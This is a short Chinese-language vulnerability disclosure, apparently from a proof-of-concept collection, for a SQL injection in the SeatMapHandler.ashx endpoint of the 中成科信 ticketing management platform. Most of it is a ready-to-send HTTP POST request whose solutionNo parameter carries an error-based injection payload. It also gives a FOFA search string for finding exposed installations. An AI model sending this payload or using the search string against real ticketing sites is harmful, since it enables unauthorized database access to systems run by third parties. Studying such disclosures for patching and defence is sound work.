# 漏洞描述

中成科信专注于智慧景区、智慧剧院、智慧场馆票务系统研发,百余个成功案例,为您提供票务系统技术支持及票务营销方案。中成科信票务管理平台SeatMapHandler存在SQL注入漏洞

# 影响版本

中成科信票务管理平台

# fofa

body="技术支持：北京中成科信科技发展有限公司" 

# 漏洞复现

```yaml
POST /SystemManager/Comm/SeatMapHandler.ashx HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: ASPSESSIONIDCCRBRCTD=LHLBDIBAKDEGBCJGKIKMNODE
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

Method=GetZoneInfo&solutionNo=%27+AND+4172+IN+%28SELECT+%28CHAR%28104%29%2BCHAR%28101%29%2BCHAR%28108%29%2BCHAR%28108%29%2BCHAR%28111%29%29%29--+bErE
```